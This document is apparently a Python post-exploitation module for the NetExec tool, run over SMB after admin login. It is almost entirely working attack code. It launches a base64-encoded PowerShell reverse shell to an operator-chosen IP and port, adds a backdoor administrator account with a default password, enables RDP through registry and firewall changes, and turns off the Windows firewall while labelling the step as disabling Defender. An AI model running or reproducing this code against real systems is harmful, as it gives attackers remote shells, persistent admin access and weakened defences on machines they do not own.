#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# from .... import ....
import base64

class NXCModule:

    name = 'space'
    description = "This module allows the user feel comfortable :)"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        TECHNIQUE: String specifying the persistence technique to use.
        Supported techniques:
        1. 'create_user' - Create a new user/admin to the machine.
        2. 'enable_rdp' - Enable the RDP Protocol.
        3. 'close_defender' - Close defender.
        4. 'get_shell' - Try to spawn shell
        '''
        
        self.TECHNIQUE = module_options['TECHNIQUE']
        self.user = 'test_user'
        self.password = 'test123@'

        self.ip = ""
        self.port = None

        if 'IP_ADDRESS' in module_options:
            self.ip = module_options['IP_ADDRESS']
        if 'PORT' in module_options:
            self.port = module_options['PORT']


        if 'USER' in module_options:
            self.user = module_options['USER']
        if 'PASS' in module_options:
            self.password = module_options['PASS']


    def get_shell(self, context, connection):
        """
        Try to spawn a shell
        """
        if not self.ip or not self.port:
            context.log.highlight("Please provide IP and PORT !!!")
        else:
            context.log.highlight("Trying to create shell")

            shell_command = f'''
            $client = New-Object System.Net.Sockets.TCPClient('{self.ip}', {self.port});
            $stream = $client.GetStream();
            [byte[]]$bytes = 0..65535|%{{0}};
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
                $data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i);
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String);
                $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
                $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);
                $stream.Write($sendbyte, 0, $sendbyte.Length);
                $stream.Flush();
            }}
            $client.Close();
            '''

            encoded_command = base64.b64encode(shell_command.encode("utf-16")).decode()

            com = f"powershell -e {encoded_command}"
            context.log.highlight("Trying to execute shell")
            context.log.highlight("Check your listener!")
            output = connection.execute(com, True)
            


    def enable_rdp(self,context,connection):
        """
        Try to open RDP 
        """

        context.log.highlight("Start RDP Service")
        command0 = "sc start TermService"
        out0 = connection.execute(command0, True)
        context.log.highlight(out0)


        context.log.highlight("Try to open RDP on local machine")
        command1 = '(reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f)'
        out1 = connection.execute(command1, True)
        context.log.highlight(out1)


        context.log.highlight("Try to open RDP port for TCP")
        command2 = '(netsh advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow protocol=TCP localport=3389)'
        out2 = connection.execute(command2, True)
        context.log.highlight(out2)

    def create_user(self,context,connection):
        """
        Try to add new user to the Admin Group
        """

        if self.user == "test_user" and self.password == "test123@":
            context.log.highlight("No credentials were submitted!!! Using default user and default password!!!")
        context.log.highlight(f"Trying to add {self.user} with {self.password} password to the admin group")
        command = f'(net user {self.user} "{self.password}" /add && net localgroup administrators {self.user} /add)'
        p = connection.execute(command, True)
        context.log.highlight(p)


    def close_defender(self,context,connection):

        """
        Close the defender
        """

        context.log.highlight("Try to turn off the Windows Defender")
        command = ("netsh advfirewall set allprofiles state off")
        output = connection.execute(command,True)
        context.log.highlight(f"The result : {output}")

    def on_login(self, context, connection):
        pass  

    def on_admin_login(self, context, connection):
        #command = ''
        #context.log.info('Executing command')
        #p = connection.execute(command, True)
        #context.log.highlight(p)

        # Check TECHNIQUE and execute add_user if specified 
        if self.TECHNIQUE == "create_user":
            self.create_user(context, connection)
        if self.TECHNIQUE == "enable_rdp":
            self.enable_rdp(context,connection)
        if self.TECHNIQUE == "close_defender":
            self.close_defender(context,connection)
        if self.TECHNIQUE == "get_shell":
            self.get_shell(context,connection)

